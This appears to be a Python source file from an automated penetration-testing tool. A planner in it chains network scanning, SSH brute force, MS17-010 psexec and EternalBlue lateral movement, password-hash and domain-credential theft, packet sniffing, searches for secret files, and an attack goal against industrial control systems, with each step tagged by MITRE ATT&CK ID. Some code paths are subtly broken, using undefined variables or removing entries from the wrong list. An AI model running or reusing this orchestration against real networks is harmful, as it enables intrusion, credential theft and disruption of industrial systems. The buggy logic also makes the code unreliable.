from arsenal import arpscan
from arsenal import mynmap
from arsenal import msploit
from arsenal import masscan
from arsenal import ics_detect
from database import write_json
from database import attack_tree
from database import mushilogger
import json
import random
import subprocess
import copy
import pprint
from ipaddress import IPv4Network
from ipaddress import IPv4Interface
from ipaddress import IPv4Address

class GoapSymbol():
  node = []
  link = []
  node_json = {}
  node_id = 0
  pre_node_id = 0
  mushikago_ipaddr = ""
  class_a = []
  class_b = []
  mode = ""

  def __init__(self, actionfile):
    print("init symbol..")

    self.actions = self.load_action(actionfile)
    if actionfile == "actions-it.json":
      self.mode = "it"
    elif actionfile == "actions-ics.json":
      self.mode = "ics"

    self.mushikago_ipaddr = self.get_ipaddr()

    self.class_a.append('10.0.0.0')
    for num in range(1, 256):
      self.class_a.append(str(IPv4Address('10.0.0.0') + 65536*num))

    self.class_b.append('172.16.0.0')
    for num in range(1, 16):
      self.class_b.append(str(IPv4Address('172.16.0.0') + 65536*num))
   
    self.goal = {
      "GoalSymbol_AttackIcs": True, 
      "GoalSymbol_GetLocalSecretInfo": True,
      "GoalSymbol_GetNwSecretInfo": True
    }

    self.state = {
      "Symbol_GetLanNodes": None,
      "Symbol_TcpScan": None,
      "Symbol_UdpScan": None,
      "Symbol_IdentOs": None,
      "Symbol_LateralMovement": None,
      "Symbol_ArpPoisoning": None,
      "Symbol_GetNetworkInfo": None,
      "Symbol_DCCheck": None,
      "Symbol_LogonUserInfo": None,
      "Symbol_DomainUser": None,
      "Symbol_LocalUser": None,
      "Symbol_ValidUser": None,
      "Symbol_CreateUser": None,
      "Symbol_GetOsPatch": None,
      "Symbol_PrivilegeEscalation": None,
      "Symbol_ProcessInfo": None,
      "Symbol_ProcessMigrate": None,
      "Symbol_MainDriveInfo": None,
      "Symbol_SearchMainDrive": None,
      "Symbol_NwDriveInfo": None,
      "Symbol_SearchNwDrive": None,
      "GoalSymbol_GetLocalSecretInfo": None,
      "GoalSymbol_GetNwSecretInfo": None,
      "Symbol_PacketInfo": None,
      "Symbol_GetIcsProtocol": None,
      "Symbol_GetIcsDevice": None,
      "GoalSymbol_AttackIcs": None
    }

    self.wjson = write_json.WriteJson()

    self.wcsv = attack_tree.AttackTree()
    self.pre_exe = None

    self.mlogger = mushilogger.MushiLogger()

  def load_action(self, actionfile): 
    with open(actionfile) as f:
      return json.load(f)


  def get_ipaddr(self):
    try:
      ipaddr = subprocess.check_output('ifconfig eth0 | grep "inet " | grep -oP \'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\' | sed \'s/inet //\'', shell=True).decode('utf-8')
      #print(res)
      return ipaddr.replace('\n', '')
    except:
      print("get-ipaddr error!!")


  
  def goap_plannning(self, goap_node):
  
    available_action = []
    plan = []
  
    #print("goap planning start..")
    self.mlogger.writelog("goap planning start..", "info")
  
    for i in range(100):
      #print("\n")
      print("\ntake = {}\n".format(i))
      #print("\n")

      if (goap_node.state["GoalSymbol_AttackIcs"] == goap_node.goal["GoalSymbol_AttackIcs"] or goap_node.state["GoalSymbol_GetLocalSecretInfo"] == goap_node.goal["GoalSymbol_GetLocalSecretInfo"] or goap_node.state["GoalSymbol_GetNwSecretInfo"] == goap_node.goal["GoalSymbol_GetNwSecretInfo"]):
        return plan
  
      for key in goap_node.actions.keys():
        match_count = 0
        for symbol, value in goap_node.actions[key]["precond"].items():
          #print("{}, {}, {}".format(key, symbol, value))
          if (goap_node.state[symbol] == value):
            match_count += 1
        if (match_count == len(goap_node.actions[key]["precond"])):
          #print("match!!")
          available_action.append(key)
  
      #print("available_action = {}".format(available_action))
      self.mlogger.writelog("available plan = " + pprint.pformat(available_action, width=500, compact=True), "info")
  
      if (len(available_action) == 0):
        #print("No available action")
        self.mlogger.writelog("No available action", "info")
        exit(0)
  
      # currentry, use Dijkstra algorithm
      # A* or Dijkstra's algorithm or random
      tmp = 100
      tmp_list = []
      for key in available_action:
        if (goap_node.actions[key]["priority"] < tmp):
          priority_key = key
          tmp = goap_node.actions[key]["priority"]
          tmp_list.clear()
          tmp_list.append(priority_key)
        elif (goap_node.actions[key]["priority"] == tmp):
          tmp_list.append(key)
  
      #print("tmp_list = {}".format(tmp_list))
      #print("len(tmp_list) = {}".format(len(tmp_list)))
  
      #for i in range(len(tmp_list)):
      #  if priority_key not in plan:
      #    break
  
      while (True):
        priority_key = random.choice(tmp_list)
        if priority_key not in plan:
          break
  
      #print("{}, {}".format(priority_key, goap_node.actions[priority_key]))
  
      #print("pre_choise_key = {}".format(pre_choise_key))
  
      plan.append(priority_key)
      available_action.clear()
  
      #print("plan = {}".format(plan))
      #print("state = {}".format(goap_node.state))
  
      for key, value in goap_node.actions[priority_key]["effect"].items():
        goap_node.state[key] = value
        #print("key = {}, value = {}".format(key, value))
  
      #print("state = {}".format(goap_node.state))


  def select_target(self):
    target_list = {}
    performed_list = {}

    for num in range(1, len(self.node)): # num 0 is mushikago 
      if self.node[num]["os"] == "Linux":
        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
          if len(self.node[num]["ports"]) > 0:
            for port_num in range(0, len(self.node[num]["ports"])):
              #if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
              if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
                target_list[self.node[num]["id"]] = num
        else:
          if self.mode == "it":
            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
              performed_list[self.node[num]["id"]] = num
          elif self.mode == "ics":
            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
              performed_list[self.node[num]["id"]] = num
      if self.node[num]["os"] == "Windows":
        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
          target_list[self.node[num]["id"]] = num
        else:
          if self.mode == "it":
            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
              performed_list[self.node[num]["id"]] = num
          elif self.mode == "ics":
            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
              performed_list[self.node[num]["id"]] = num

    print("target_list = {}".format(target_list))
    print("performed_list = {}".format(performed_list))

    if len(performed_list) != 0:
      target, node_num = random.choice(list(performed_list.items()))
      target_list.clear()
      performed_list.clear()
      #print("goap_state = {}".format(self.node[node_num]["goap"]))
      return target, node_num, self.node[node_num]["goap"]
    elif len(target_list) != 0:
      target, node_num = random.choice(list(target_list.items()))
      target_list.clear()
      performed_list.clear()
      #print("goap_state = {}".format(self.node[node_num]["goap"]))
      return target, node_num, self.node[node_num]["goap"]
    else:
      return None, None, None
    

  def plan_execute(self, goap_node, node_id, plan, target, node_num):
    #print("plan = {}".format(plan))

    self.mlogger.writelog("action plan = " + pprint.pformat(plan, width=500, compact=True), "info")

    for p in plan:
      print("execute action = {}".format(p))


      if p == "arpscan":
        if target == self.mushikago_ipaddr:
          pre_node_id = node_id
          arpscanInstance = arpscan.ArpScan()
          node_id = arpscanInstance.execute_arpscan(self.node, self.link, node_id)
          node_id = node_id + 1 # mushikago used
          self.node_json['nodes'] = self.node
          self.node_json['links'] = self.link
          #print("node_json = {}".format(self.node_json))
          #print("node_id = {}".format(node_id))

          if self.pre_exe == None:
            self.wcsv.write(["name", "parent", "ip", "mitre"])
            target = self.node[0]["id"] # target to mushikago

          self.wcsv.write(["T1120 (arpscan) - " + self.node[0]["id"], self.pre_exe, self.node[0]["id"], "T1120"])
          self.pre_exe = "T1120 (arpscan) - " + self.node[0]["id"]

          goap_node.state["Symbol_GetLanNodes"] = True
          self.node[0]["goap"] = copy.deepcopy(goap_node.state)

          self.wjson.write(self.node_json)


        else:
          exploit = msploit.MetaSploit()
          nwaddr = IPv4Interface(target+'/16').network
          exploit.execute_arpscan(str(nwaddr[0]), "/16", self.node, node_num)

          pre_node_id = node_id
          arpscanInstance = arpscan.ArpScan()

          node_id = arpscanInstance.execute_arpscan_fm_mp(self.node, self.link, node_id, target)

          self.wcsv.write(["T1120 (arpscan) - " + target, self.pre_exe, target, "T1120"])

          goap_node.state["Symbol_GetLanNodes"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

          self.wjson.write(self.node_json)



      elif p == "tcpscan":
        mynmapInstance = mynmap.MyNmap()

        proxy = 0

        for num in range(pre_node_id, node_id, 1):
          mynmapInstance.execute_nmap(self.node[num]["id"], num, self.node, proxy)

        #print("node_json = {}".format(self.node_json))

        if self.pre_exe == "T1120 (arpscan) - " + self.node[0]["id"]: # If first tcpscan
          self.wcsv.write(["T1046 (tcpscan) - " + self.node[0]["id"], self.pre_exe, self.node[0]["id"], "T1046, T1018"])
          self.pre_exe = "T1046 (tcpscan) - " + self.node[0]["id"]

          goap_node.state["Symbol_TcpScan"] = True
          goap_node.state["Symbol_IdentOs"] = True
          self.node[0]["goap"] = copy.deepcopy(goap_node.state)
        else:
          self.wcsv.write(["T1046 (tcpscan) - " + target, self.pre_exe, target, "T1046, T1018"])

          goap_node.state["Symbol_TcpScan"] = True
          goap_node.state["Symbol_IdentOs"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)



      elif p == "exploit_lateral":
        res = -1

        # select exploit

        if res != 0 and self.node[node_num]["os"] == "Linux":
          exploit = msploit.MetaSploit()
          res = exploit.execute_ssh_bruteforce(target, node_num, self.node)

        if res != 0:
          for num in range(1, len(self.node)): 
            if len(self.node[num]["local_account_pass"]) > 0:
              value = iter(self.node[num]["local_account_pass"])
              for account, password in zip(value, value):
                exploit = msploit.MetaSploit()
                res = exploit.execute_ms17_10_psexec(target, node_num, self.node, self.mushikago_ipaddr, account, password)
                if res == 0:
                  break
            else:
              continue

        if res != 0 and self.node[node_num]["os"] == "Windows":
          for num in range(1, len(self.node)): 
            if len(self.node[num]["local_account_pass"]) > 0:
              value = iter(self.node[num]["local_account_pass"])
              for account, password in zip(value, value):
                exploit = msploit.MetaSploit()
                res = exploit.execute_ms17_10_psexec(target, node_num, self.node, self.mushikago_ipaddr, account, password)
                if res == 0:
                  break
            else:
              continue

        if res != 0 and self.node[node_num]["os"] == "Windows":
          exploit = msploit.MetaSploit()
          res = exploit.execute_eternalblue(target, node_num, self.node, self.mushikago_ipaddr)

        if res == 0:
          goap_node.state["Symbol_LateralMovement"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

          self.wcsv.write(["TA0008 (exploit_lateral) - " + target, self.pre_exe, target, "TA0008"])
          self.pre_exe = "TA0008 (exploit_lateral) - " + target

          self.wjson.write(self.node_json)
        else:
          goap_node.state["Symbol_LateralMovement"] = False
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

          self.wcsv.write(["TA0008 (exploit_lateral) - " + target, self.pre_exe, target, "TA0008"])
          self.pre_exe = "TA0008 (exploit_lateral) - " + target

          self.wjson.write(self.node_json)

          #print("replanning...")

          self.mlogger.writelog("replanning...", "info")

          return node_id


        """
        exploit.execute_bluekeep("10.1.200.5")
        exploit.execute_incognito()
        """


      elif p == "get_networkinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_ipconfig(node_num, self.node)

        exploit.execute_netstat(node_num, self.node)

        self.wcsv.write(["T1016(get_networkinfo) - " + target, self.pre_exe, target, "T1016, T1049"])
          
        goap_node.state["Symbol_GetNetworkInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


        
      elif p == "get_processinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_ps(node_num, self.node)

        self.wcsv.write(["T1057 (get_processinfo) - " + target, self.pre_exe, target, "T1057, T1059"])

        goap_node.state["Symbol_ProcessInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_local_user":
        exploit = msploit.MetaSploit()
        exploit.execute_netuser(node_num, self.node)

        exploit.get_hash(target, node_num, self.node)

        self.wcsv.write(["T1087 (get_local_user) - " + target, self.pre_exe, target, "T1087"])

        goap_node.state["Symbol_LocalUser"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_domain_user":
        exploit = msploit.MetaSploit()
        exploit.execute_netuserdomain(node_num, self.node)

        exploit.execute_creds_tspkg(node_num, self.node)

        self.wcsv.write(["T1087 (get_domain_user) - " + target, self.pre_exe, target, "T1087"])

        goap_node.state["Symbol_DomainUser"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)



      elif p == "get_ospatch":
        exploit = msploit.MetaSploit()
        exploit.execute_getospatch(node_num, self.node)

        self.wcsv.write(["T1003 (get_ospatch) - " + target, self.pre_exe, target, "T1003, T1059, T1082"])
        
        goap_node.state["Symbol_GetOsPatch"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_maindrvinfo":
        exploit = msploit.MetaSploit()
        secret_data =  exploit.execute_getmaindrvinfo(node_num, self.node)

        self.wcsv.write(["T1083 (get_maindrvinfo) - " + target, self.pre_exe, target, "T1083, TA0009, TA0010"])
        
        goap_node.state["Symbol_MainDriveInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_netdrvinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_netuse(node_num, self.node)

        self.wcsv.write(["T1083 (get_netdrvinfo) - " + target, self.pre_exe, target, "T1083, T1135"])

        goap_node.state["Symbol_NetDriveInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_local_secretinfo":
        exploit = msploit.MetaSploit()
        secret_data = exploit.execute_getlocalsecretinfo(node_num, self.node)

        self.wcsv.write(["TA0009 (get_local_secretinfo) - " + target, self.pre_exe, target, "TA0009"])
        
        if secret_data == 1:
          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = True
        else:
          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = False

        goap_node.state["Symbol_SearchMainDrive"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_nw_secretinfo":
        secret_data = 0

        if len(self.node[node_num]["network_drive"]) > 0:
          exploit = msploit.MetaSploit()
          secret_data = exploit.execute_getnwsecretinfo(node_num, self.node)

        self.wcsv.write(["TA0009 (get_nw_secretinfo) - " + target, self.pre_exe, target, "TA0009"])

        if secret_data == 1:
          goap_node.state["GoalSymbol_GetNwSecretInfo"] = True
        else:
          goap_node.state["GoalSymbol_GetNwSecretInfo"] = False

        goap_node.state["Symbol_SearchNwDrive"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "get_packetinfo":
        exploit = msploit.MetaSploit()

        if self.node[node_num]["os"] == "Windows":
          exploit.execute_sniff_win(node_num, self.node)
        elif self.node[node_num]["os"] == "Linux":
          exploit.execute_sniff_linux(node_num, self.node)

        self.wcsv.write(["T1040 (get_packetinfo) - " + target, self.pre_exe, target, "T1040"])

        goap_node.state["Symbol_PacketInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)


      elif p == "detect_ics_protocol":
        ics = ics_detect.IcsDetect()

        ics.detect_protocol(node_num, self.node)
        
        self.wcsv.write(["T1046 (detect_ics_protocol) - " + target, self.pre_exe, target, "T1046"])

        goap_node.state["Symbol_GetIcsProtocol"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)



      elif p == "detect_ics_device":
        ics = ics_detect.IcsDetect()
        ics.detect_device(node_num, self.node)
        
        self.wcsv.write(["T1120 (detect_ics_device) - " + target, self.pre_exe, target, "T1120"])

        goap_node.state["Symbol_GetIcsDevice"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        self.wjson.write(self.node_json)



    #self.wjson.write(self.node_json)

    #print("node = {}".format(self.node))
    return node_id


  def check_ipaddr(self, ipaddr):
    for num in range(1, len(self.node)): 
      if ipaddr == self.node[num]["id"]:
        return -1
    return 0


  def getip_from_ipconfig_info(self, num, ipaddr_list):
    value = iter(self.node[num]["ipconfig_info"])

    for ipaddr, netmask in zip(value, value):
      if ipaddr != self.node[num]["id"]:
        #print("ipaddr = {}, netmask = {}".format(ipaddr, netmask))
        self.mlogger.writelog("ipaddr = " + ipaddr + ", netmask = " + netmask, "debug")
        res = self.check_ipaddr(ipaddr)
        if res == 0:
          ipaddr_list[ipaddr] = num


  def getip_from_netstat_info(self, num, ipaddr_list):
    value = iter(self.node[num]["netstat_info"])

    for ipaddr, port in zip(value, value):
      if ipaddr != self.node[0]["id"]:
        #print("ipaddr = {}, port = {}".format(ipaddr, port))
        self.mlogger.writelog("ipaddr = " + ipaddr + ", port = " + port, "debug")
        res = self.check_ipaddr(ipaddr)
        if res == 0:
          ipaddr_list[ipaddr] = num


  def scan_from_network_info(self, ipaddr_list, getnw_list):
    for num in range(1, len(self.node)): 
      if self.node[num]["session"] != "":
        #print("session is exist = {}".format(self.node[num]["id"]))
        self.mlogger.writelog("session is exist = " + self.node[num]["id"], "debug")
        if self.node[num]["goap"]["Symbol_GetNetworkInfo"] == True:
          if self.node[num]["ipconfig_info"] != "":
            #print("ipconfig_info is exist = {}".format(self.node[num]["ipconfig_info"]))
            self.mlogger.writelog("ipconfig_info is exist = " + pprint.pformat(self.node[num]["ipconfig_info"]), "debug")
            self.getip_from_ipconfig_info(num, ipaddr_list)
          if self.node[num]["netstat_info"] != "":
            #print("netstat_info is exist = {}".format(self.node[num]["netstat_info"]))
            self.mlogger.writelog("netstat_info is exist = " + pprint.pformat(self.node[num]["netstat_info"]), "debug")
            self.getip_from_netstat_info(num, ipaddr_list)
        else:
          getnw_list.append(num)
      else:
        #print("session is nothing = {}".format(self.node[num]["id"]))
        self.mlogger.writelog("session is nothing = " + self.node[num]["id"], "debug")


  def force_get_networkinfo(self, goap_node, node_id, ipaddr_list, getnw_list):
    for node_num in getnw_list:
      print("get_networkinfo ipaddr = {}".format(self.node[node_num]["goap"]))
      goap_node.state = copy.deepcopy(self.node[node_num]["goap"])
      target = self.node[node_num]["id"]
      plan = ["get_networkinfo"]
      node_id = goap_node.plan_execute(goap_node, node_id, plan, target, node_num)

    self.scan_from_network_info(ipaddr_list, getnw_list)


  def segment_scan(self, exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, private_ip):
    nwaddr = IPv4Interface(ipaddr+'/16').network
    #print("scan nwaddr = {}".format(nwaddr))
    self.mlogger.writelog("scan nwaddr = " + str(nwaddr), "info")
    #print("nwaddr_10[0] = {}".format(nwaddr[0]))
    
    if private_ip == 10:
      for scan_nwaddr in self.class_a:
        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
        node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 

        if node_id > pre_node_id:
          try:
            delete_index = self.class_a.index(str(nwaddr[0]))
            self.class_a.pop(delete_index)
          except:
            pass
          break
    elif private_ip == 172:
      for scan_nwaddr in self.class_b:
        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
        node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 
        if node_id > pre_node_id:
          try:
            delete_index = self.class_a.index(str(nwaddr[0]))
            self.class_a.pop(delete_index)
          except:
            pass
          break
    elif private_ip == 192:
      exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
      node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 

    return node_id


  def network_scan(self, node_id, goap_node):
    #print("Starting a Network Scan...")
    self.mlogger.writelog("Starting a Network Scan...", "info")

    exploit = msploit.MetaSploit()
    exploit.execute_socks()

    ipaddr_list = {}
    getnw_list = []

    self.scan_from_network_info(ipaddr_list, getnw_list)

    if len(ipaddr_list) == 0 and len(getnw_list) != 0:
      print("getnw_list = {}".format(getnw_list))
      self.force_get_networkinfo(goap_node, node_id, ipaddr_list, getnw_list)
    
    if len(ipaddr_list) > 0:
      print("ipaddr_list = {}".format(ipaddr_list))
      for scan_ip, node_num in ipaddr_list.items():
        print("scan_ip = {}, node_num = {}".format(scan_ip, node_num))
        #exploit = msploit.MetaSploit()
        exploit.setting_route(scan_ip, "255.255.255.255", self.node[node_num]["session"])
        nwscan = masscan.MasScan()
        node_id = nwscan.execute_masscan(scan_ip, self.node[node_num]["id"], self.node, self.link, node_id) 
    else:
      session_exist_list = {}
      #for num in range(1, len(self.node)): 
      for num in range(len(self.node)-1, -1, -1):
        if self.node[num]["session"] != "":
          session_exist_list[self.node[num]["id"]] = num

      if (len(session_exist_list) > 0):
        nwscan = masscan.MasScan()
        pre_node_id = node_id

        for ipaddr, node_num in session_exist_list.items():
          print("scan_src_ipaddr= {}".format(ipaddr))
          s2 = ipaddr.split('.')
          if (s2[0] == "10"):
            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 10)
            if node_id > pre_node_id:
              break
          elif (s2[0] == "172"):
            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 172)
            if node_id > pre_node_id:
              break
          elif (s2[0] == "192"):
            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 192)
            if node_id > pre_node_id:
              break
      else:
        nwscan = masscan.MasScan()
        pre_node_id = node_id

        s2 = self.mushikago_ipaddr.split('.')

        if (s2[0] == "10"):
          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 10)
        elif (s2[0] == "172"):
          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 172)
        elif (s2[0] == "192"):
          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 192)

    self.wjson.write(self.node_json)

    self.wcsv.write(["T1046 (network scan)", self.pre_exe, self.mushikago_ipaddr, "T1046"])
    self.pre_exe = "T1046 (network scan)"


    return node_id

